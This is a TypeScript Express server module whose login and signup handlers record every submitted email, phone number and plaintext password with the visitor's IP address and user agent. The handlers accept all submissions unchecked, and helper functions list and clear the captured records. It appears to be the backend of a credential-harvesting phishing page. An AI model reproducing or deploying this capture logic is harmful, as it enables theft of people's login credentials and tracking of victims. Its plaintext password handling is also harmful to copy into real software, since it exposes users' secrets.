import { RequestHandler } from "express";

// Simple ID generator
function generateId() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// In-memory storage for page visits and login attempts
const pageVisits: Array<{
  id: string;
  ipAddress: string;
  userAgent: string;
  visitTimestamp: string;
  email: string;
  phone: string;
  password: string;
  loginTimestamp: string | null;
  type: "visit" | "login" | "signup";
}> = [];

// Keep attempts array for backward compatibility
const attempts: Array<{
  id: string;
  email: string;
  phone: string;
  password: string;
  ipAddress: string;
  userAgent: string;
  timestamp: string;
  type: "login" | "signup";
}> = [];

export const handleTrackVisit: RequestHandler = (req, res) => {
  const ipAddress =
    (req.headers["x-forwarded-for"] as string)?.split(",")[0] ||
    req.socket.remoteAddress ||
    "unknown";

  const userAgent = req.headers["user-agent"] || "unknown";

  // Check if this IP already has a visit record
  const existingVisit = pageVisits.find((v) => v.ipAddress === ipAddress);

  if (!existingVisit) {
    // Create new visit record only if IP doesn't exist
    const visit = {
      id: generateId(),
      ipAddress,
      userAgent,
      visitTimestamp: new Date().toISOString(),
      email: "",
      phone: "",
      password: "",
      loginTimestamp: null,
      type: "visit" as const,
    };
    pageVisits.push(visit);
  }

  res.json({
    success: true,
    message: "Visit tracked",
    ipAddress,
  });
};

export const handleLogin: RequestHandler = (req, res) => {
  const { email, phone, password } = req.body;

  // Get IP address
  const ipAddress =
    (req.headers["x-forwarded-for"] as string)?.split(",")[0] ||
    req.socket.remoteAddress ||
    "unknown";

  // Find existing visit record by IP
  const existingVisit = pageVisits.find((v) => v.ipAddress === ipAddress);

  if (existingVisit) {
    // Update existing record with login info
    existingVisit.email = email || "";
    existingVisit.phone = phone || "";
    existingVisit.password = password || "";
    existingVisit.loginTimestamp = new Date().toISOString();
    existingVisit.type = "login";
  } else {
    // Fallback: create new record if visit wasn't tracked
    const visit = {
      id: generateId(),
      ipAddress,
      userAgent: req.headers["user-agent"] || "unknown",
      visitTimestamp: new Date().toISOString(),
      email: email || "",
      phone: phone || "",
      password: password || "",
      loginTimestamp: new Date().toISOString(),
      type: "login" as const,
    };
    pageVisits.push(visit);
  }

  // Also keep in attempts for backward compatibility
  const attempt = {
    id: generateId(),
    email: email || "",
    phone: phone || "",
    password: password || "",
    ipAddress,
    userAgent: req.headers["user-agent"] || "unknown",
    timestamp: new Date().toISOString(),
    type: "login" as const,
  };

  attempts.push(attempt);

  // Return success (for demo purposes, always accept)
  res.json({ success: true, message: "Login recorded" });
};

export const handleSignup: RequestHandler = (req, res) => {
  const { firstName, lastName, email, password } = req.body;

  // Get IP address
  const ipAddress =
    (req.headers["x-forwarded-for"] as string)?.split(",")[0] ||
    req.socket.remoteAddress ||
    "unknown";

  // Store the attempt
  const attempt = {
    id: generateId(),
    email: email || "",
    phone: "",
    password: password || "",
    ipAddress,
    userAgent: req.headers["user-agent"] || "unknown",
    timestamp: new Date().toISOString(),
    type: "signup" as const,
  };

  attempts.push(attempt);

  // Return success (for demo purposes, always accept)
  res.json({ success: true, message: "Signup recorded" });
};

export function getAttempts() {
  return attempts;
}

export function getPageVisits() {
  return pageVisits;
}

export function addAttempt(attempt: (typeof attempts)[0]) {
  attempts.push(attempt);
}

export function removeAttempt(id: string) {
  const index = attempts.findIndex((a) => a.id === id);
  if (index > -1) {
    attempts.splice(index, 1);
    return true;
  }
  return false;
}

export function removePageVisit(id: string) {
  const index = pageVisits.findIndex((v) => v.id === id);
  if (index > -1) {
    pageVisits.splice(index, 1);
    return true;
  }
  return false;
}

export function clearAttempts() {
  attempts.length = 0;
}

export function clearPageVisits() {
  pageVisits.length = 0;
}
